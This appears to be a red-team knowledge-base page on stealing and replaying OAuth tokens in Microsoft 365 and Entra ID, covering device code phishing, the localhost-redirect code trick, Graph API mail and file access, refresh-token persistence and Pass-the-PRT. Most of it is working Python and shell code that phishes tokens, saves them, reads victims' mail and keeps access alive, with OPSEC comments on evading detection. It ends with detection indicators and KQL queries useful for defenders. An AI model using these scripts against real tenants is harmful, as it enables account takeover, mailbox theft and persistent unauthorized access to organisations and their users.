# OAuth Token Abuse -- Device Code Phishing, Token Replay, and Pass-the-PRT

**MITRE ATT&CK**: T1528 - Steal Application Access Token, T1550.001 - Application Access Token

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

OAuth 2.0 is the authentication backbone of Microsoft 365, Azure, and most SaaS
platforms. Attackers abuse OAuth flows to steal access and refresh tokens, gaining
persistent cloud access without ever needing a password. The **device code phishing**
flow is especially effective -- the victim only visits a URL and enters a short code.

## OAuth 2.0 Flow Overview

| Flow | Use Case | Attack Surface |
|---|---|---|
| Authorization Code | Web apps with backend | Code interception, redirect URI manipulation |
| Client Credentials | Service-to-service | Secret/cert theft from config files, env vars |
| Device Code | Input-constrained devices | Social engineering -- victim enters code for attacker |
| Refresh Token | Token renewal | Token theft from disk, memory, or token cache |

## Device Code Phishing -- Step by Step

1. Attacker POSTs to `/oauth2/v2.0/devicecode` with a `client_id` (e.g., Azure CLI:
   `04b07795-a710-4e7f-9ddf-4929e8cb3e18`).
2. Azure responds with a `user_code` and a `device_code`.
3. Attacker sends `user_code` to victim (email, chat, phone) and directs them to
   `https://microsoft.com/devicelogin`.
4. Victim authenticates with credentials + MFA.
5. Attacker polls `/oauth2/v2.0/token` with the `device_code` until authorization.
6. Attacker receives `access_token` + `refresh_token`.

### Python -- Device Code Flow

```python
"""
device_code_phish.py -- Device code phishing for Azure AD / Entra ID.
DETECTION: Sign-in logs show authenticationProtocol=deviceCode; Azure CLI client_id
in device-code sign-ins from non-CLI users is suspicious; impossible travel between
attacker IP (initiation) and victim location (authentication).
OPSEC: Use first-party client_ids (Azure CLI, PowerShell, Office) to avoid unknown-
app alerts. Code expires in 15 min -- social engineering must be fast. Refresh tokens
immediately from a clean IP to detach from victim's location.
"""
import requests, time, json, sys

TENANT   = "common"
CLIENT   = "04b07795-a710-4e7f-9ddf-4929e8cb3e18"   # Azure CLI
SCOPE    = "https://graph.microsoft.com/.default offline_access"
DC_URL   = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
TOK_URL  = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"

def initiate() -> dict:
    # DETECTION: This POST is NOT in sign-in logs -- initiation is invisible.
    # OPSEC: user_code is 8-9 chars, case-insensitive -- easy to relay verbally.
    r = requests.post(DC_URL, data={"client_id": CLIENT, "scope": SCOPE}, timeout=10).json()
    print(f"[*] Code: {r['user_code']}  URL: {r['verification_uri']}  Expires: {r['expires_in']}s")
    return r

def poll(device_code: str, interval: int = 5) -> dict:
    # DETECTION: Only successful token issuance is logged; polling itself is not.
    # OPSEC: Respect server interval to avoid rate-limit errors visible to victim.
    data = {"grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": CLIENT, "device_code": device_code}
    while True:
        r = requests.post(TOK_URL, data=data, timeout=10).json()
        if "access_token" in r:
            print(f"[+] Token obtained!  expires_in={r.get('expires_in')}s")
            return r
        err = r.get("error", "")
        if err == "authorization_declined": sys.exit("[-] Declined")
        if err == "expired_token": sys.exit("[-] Expired")
        time.sleep(interval)

if __name__ == "__main__":
    flow = initiate()
    tokens = poll(flow["device_code"], flow.get("interval", 5))
    with open("tokens.json", "w") as f: json.dump(tokens, f, indent=2)
```

## Token Types

| Token | Lifetime | Storage | Abuse Potential |
|---|---|---|---|
| Access Token | ~1 hour | Memory, HTTP headers | Short-term API access |
| Refresh Token | 90 days (revocable) | Disk (token cache), memory | Long-term persistence |
| Primary Refresh Token (PRT) | Session-bound | TPM or LSASS memory | SSO to all Azure AD apps |

## Graph API Abuse with Stolen Tokens

```python
"""
graph_api_abuse.py -- Enumerate Microsoft 365 with a stolen access token.
DETECTION: Unified Audit Log MailItemsAccessed for mail reads; Azure AD audit logs
for Graph calls; bulk /users enumeration triggers "Mass access" anomaly detection.
OPSEC: Throttle calls to avoid 429s; use $select to minimize footprint; avoid CLI
client_id for mail access (use Outlook client_id if possible).
"""
import requests, json

GRAPH = "https://graph.microsoft.com/v1.0"

class GraphClient:
    def __init__(self, token: str):
        # OPSEC: Check token expiry first; 401 on expired token is logged.
        self.h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    def me(self) -> dict:
        # DETECTION: /me is low signal alone but canonical first call after theft.
        return requests.get(f"{GRAPH}/me", headers=self.h, timeout=10).json()

    def list_users(self, top=50) -> list:
        # DETECTION: Bulk /users triggers "Mass access to users" anomaly.
        return requests.get(f"{GRAPH}/users?$top={top}&$select=displayName,mail",
            headers=self.h, timeout=10).json().get("value", [])

    def read_mail(self, uid="me", top=10) -> list:
        # DETECTION: MailItemsAccessed in Unified Audit Log; Defender flags rapid reads.
        return requests.get(f"{GRAPH}/{uid}/messages?$top={top}&$select=subject,from,receivedDateTime",
            headers=self.h, timeout=10).json().get("value", [])

    def list_onedrive(self, uid="me") -> list:
        # DETECTION: FileAccessed/FileDownloaded in Unified Audit Log.
        return requests.get(f"{GRAPH}/{uid}/drive/root/children?$select=name,size",
            headers=self.h, timeout=10).json().get("value", [])

    def search_sharepoint(self, query: str) -> dict:
        # DETECTION: Search queries logged; "password"/"secret" keywords trigger DLP.
        # OPSEC: Use specific project names from prior recon, not generic keywords.
        return requests.post(f"{GRAPH}/search/query", headers=self.h, timeout=15,
            json={"requests": [{"entityTypes": ["driveItem"], "query": {"queryString": query}}]}).json()

if __name__ == "__main__":
    with open("tokens.json") as f: tokens = json.load(f)
    c = GraphClient(tokens["access_token"])
    me = c.me(); print(f"User: {me.get('displayName')} ({me.get('mail')})")
    for u in c.list_users(10): print(f"  {u.get('displayName')}: {u.get('mail')}")
    for m in c.read_mail(top=5): print(f"  [{m.get('receivedDateTime')}] {m.get('subject')}")
```

## ConsentFix Technique

Tricks the victim into pasting an authorization code back to the attacker:

1. Send victim a link to Azure CLI auth page with `redirect_uri=http://localhost`.
2. Victim authenticates; redirected to `http://localhost/?code=...` (browser error).
3. Attacker (posing as IT) asks victim to "paste the error URL so we can debug".
4. Attacker extracts the authorization code and redeems it for tokens.

```bash
# DETECTION: redirect_uri=http://localhost in sign-in logs is a strong signal.
# OPSEC: Works when device code flow is blocked by Conditional Access.
AUTH="https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
echo "${AUTH}?client_id=04b07795-a710-4e7f-9ddf-4929e8cb3e18&response_type=code&redirect_uri=http://localhost&scope=https://graph.microsoft.com/.default+offline_access"
# After victim pastes URL: extract code=... and POST to /token endpoint
```

## Refresh Token Persistence

```python
"""
token_refresh.py -- Maintain persistent access via refresh token cycling.
DETECTION: Sign-in logs show refresh redemptions (tokenIssuerType=AzureAD,
authenticationMethod=previously satisfied); new-IP refresh triggers atypical travel;
CAE can revoke within minutes of policy change.
OPSEC: Refresh from same IP/location; persist new token immediately (old is
invalidated); store encrypted at rest.
"""
import requests, json, time

CLIENT  = "04b07795-a710-4e7f-9ddf-4929e8cb3e18"
TOK_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
TOK_FILE = "tokens.json"

def refresh(rt: str) -> dict | None:
    # DETECTION: clientAppUsed + ipAddress in sign-in logs; new IP = investigation.
    # OPSEC: Each refresh returns NEW refresh token; old is invalidated immediately.
    r = requests.post(TOK_URL, data={"grant_type": "refresh_token", "client_id": CLIENT,
        "refresh_token": rt, "scope": "https://graph.microsoft.com/.default offline_access"}, timeout=10).json()
    if "error" in r: print(f"[-] {r.get('error_description')}"); return None
    with open(TOK_FILE, "w") as f: json.dump(r, f, indent=2)
    print(f"[+] Refreshed, expires_in={r['expires_in']}s"); return r

def loop():
    with open(TOK_FILE) as f: tokens = json.load(f)
    while True:
        time.sleep(max(tokens.get("expires_in", 3600) - 300, 60))
        tokens = refresh(tokens["refresh_token"])
        if not tokens: print("[-] Persistence lost"); break
```

## Pass-the-PRT -- Primary Refresh Token Extraction and Replay

The **PRT** is issued to Azure AD-joined devices, providing SSO to all Azure AD
apps. Stored in TPM (if available) or LSASS memory.

| Method | Requirement | Tool | Detection |
|---|---|---|---|
| LSASS dump | Local admin on AAD device | `mimikatz sekurlsa::cloudap` | EDR detects LSASS access |
| BrowserCore.exe abuse | User-level access | Custom binary | Process execution logging |
| ROADtools `roadtx prt` | Session key from TPM/LSASS | ROADtools | Device compliance check |

```bash
# DETECTION: PRT sign-in from non-matching device properties triggers compliance alert.
# OPSEC: Credential Guard (Win11 22H2+ default) makes PRT session key TPM-bound.
# Use roadtx for PRT-based token acquisition:
roadtx prt -c "<session_key>" -p "<prt_value>" \
  --resource "https://graph.microsoft.com" \
  --client-id "04b07795-a710-4e7f-9ddf-4929e8cb3e18"
roadtx prt -c "<session_key>" -p "<prt_value>" \
  --resource "https://management.azure.com" \
  --client-id "04b07795-a710-4e7f-9ddf-4929e8cb3e18"
```

## Detection Indicators

| Indicator | Source | Confidence |
|---|---|---|
| Device code flow sign-in (`authenticationProtocol: deviceCode`) | Azure AD Sign-in Logs | High |
| Azure CLI `client_id` in Graph API calls from non-CLI users | Azure AD Sign-in Logs | Medium-High |
| Refresh token from new IP/location | Azure AD Sign-in Logs | Medium |
| Bulk Graph API calls (mail, user enum) | Unified Audit Log | High |
| PRT sign-in from non-compliant device | Azure AD Sign-in Logs | High |
| `redirect_uri=http://localhost` in auth flow | Azure AD Sign-in Logs | Medium |

```kql
// Detect device code phishing
SigninLogs
| where AuthenticationProtocol == "deviceCode" and ResultType == 0
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress,
    Location=LocationDetails.city, ClientAppUsed
| where AppDisplayName in ("Azure CLI", "Azure PowerShell", "Microsoft Office")

// Detect anomalous Graph API mail access
AuditLogs
| where OperationName == "MailItemsAccessed"
| summarize cnt=count() by UserId=tostring(InitiatedBy.user.id), bin(TimeGenerated, 1h)
| where cnt > 50
```

## Cross-References

- [Azure AD Attack Narrative](../../13-cloud-security/azure/azure-ad-attacks.md)
- [IMDS Token Theft](imds-token-theft.md) -- alternative credential theft via metadata
- [Cloud C2 Channels](cloud-c2-channels.md) -- using stolen tokens for C2
- [AWS Initial Access](../../13-cloud-security/aws/aws-initial-access.md) -- comparable STS/SSO token theft
- [Cloud Persistence Techniques](../../13-cloud-security/cloud-persistence.md)

---
*Red team knowledge base -- authorized testing only.*
